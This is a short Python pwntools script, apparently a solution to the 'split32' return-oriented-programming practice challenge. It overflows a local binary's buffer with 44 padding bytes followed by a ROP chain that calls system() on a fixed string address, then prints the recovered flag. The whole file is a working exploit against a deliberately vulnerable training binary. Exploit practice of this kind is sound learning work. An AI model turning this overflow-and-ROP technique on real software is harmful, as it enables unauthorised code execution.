#!/usr/bin/python

from pwn import *

elf = ELF('./split32')
cat = 0x804a030

rop = ROP(elf)
rop.system(cat)

payload = "A"*44 + str(rop)


r = process(elf.path)

r.recvuntil('>')
r.sendline(payload) 
r.recv()
log.success("Flag: " + r.recv())

 